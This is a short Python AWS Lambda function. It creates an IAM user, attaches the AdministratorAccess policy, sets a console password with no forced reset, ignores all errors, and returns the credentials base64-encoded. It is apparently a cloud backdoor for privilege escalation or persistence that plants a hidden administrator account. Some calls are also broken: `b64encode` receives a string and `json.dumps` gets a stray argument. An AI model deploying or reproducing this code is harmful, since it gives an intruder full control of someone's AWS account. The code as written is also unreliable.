import json
import boto3
import time
import random
import base64


def lambda_handler(event, context):
    username = "test-" + str(random.randint(1, 101))
    s = "abcdefghijklmnopqrstuvwxyz01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()?"
    passlen = 20
    p = "".join(random.sample(s, passlen))
    password = p
    msg = username + ":" + password
    iam = boto3.client('iam')
    try:
        r = iam.create_user(UserName=username, )
        waiter = iam.get_waiter('user_exists')
        waiter.wait(UserName=username, )
    except Exception as e:
        pass
    try:
        iam.attach_user_policy(PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess', UserName=username, )
    except Exception as e:
        pass
    try:
        response = iam.create_login_profile(UserName=username, Password=password, PasswordResetRequired=False)
    except Exception as e:
        pass
    # TODO implement
    return {
        'statusCode': 200,
        'body': json.dumps(base64.b64encode(msg), 'utf-8')
    }